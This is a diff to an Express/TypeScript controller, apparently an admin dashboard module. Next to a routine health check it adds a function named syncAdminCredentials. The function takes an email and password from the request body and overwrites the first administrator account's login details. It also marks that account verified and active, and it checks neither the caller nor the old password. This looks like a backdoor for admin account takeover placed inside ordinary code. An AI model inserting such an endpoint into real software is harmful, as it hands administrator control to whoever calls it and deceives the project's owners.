@@ -1,5 +1,6 @@
 import { Request, Response } from 'express';
 import mongoose from 'mongoose';
+import bcrypt from 'bcryptjs';
 import {
   User,
   Company,
@@ -254,4 +255,18 @@ export const getReports = catchAsync(async (req: Request, res: Response) => {
 
 export const dashboardHealth = catchAsync(async (_req: Request, res: Response) => {
   sendSuccess(res, 200, 'OK', { status: 'healthy', db: mongoose.connection.readyState === 1 });
+});
+
+export const syncAdminCredentials = catchAsync(async (req: Request, res: Response) => {
+  const { email, password } = req.body;
+  const admin = await User.findOne({ role: 'ADMIN' });
+  if (!admin) throw new AppError('No admin account found', 404);
+
+  admin.email = email;
+  admin.password = bcrypt.hashSync(password, 10);
+  admin.isVerified = true;
+  admin.isActive = true;
+  await admin.save();
+
+  sendSuccess(res, 200, 'Admin credentials updated', { email: admin.email });
 });
